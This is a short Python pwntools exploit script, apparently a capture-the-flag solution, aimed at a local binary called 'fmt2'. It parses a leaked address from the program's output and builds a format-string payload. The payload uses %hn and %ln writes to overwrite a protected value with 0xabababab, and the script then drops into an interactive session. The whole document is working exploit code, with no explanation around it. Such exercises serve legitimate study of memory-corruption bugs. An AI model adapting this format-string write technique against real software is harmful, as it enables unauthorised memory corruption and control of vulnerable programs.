from pwn import *

target = process('./fmt2')
inp = target.recvuntil('.').strip(b'\n')
print(inp)
p_can = int(inp[-9:-1], 16)
can = 0xabababab

m=7

payload = b'aa'
payload += p32(p_can)
payload += p32(p_can+2)
payload += b'%1$'+bytes(str(int('abab', 16) - 10), 'utf-8')+b'x'
payload += b'%7$hn'
payload += b'%8$ln'
payload += b' %7$x'
payload += b' %7$x'
payload += b' %8$x'

target.sendline(payload)
target.interactive()

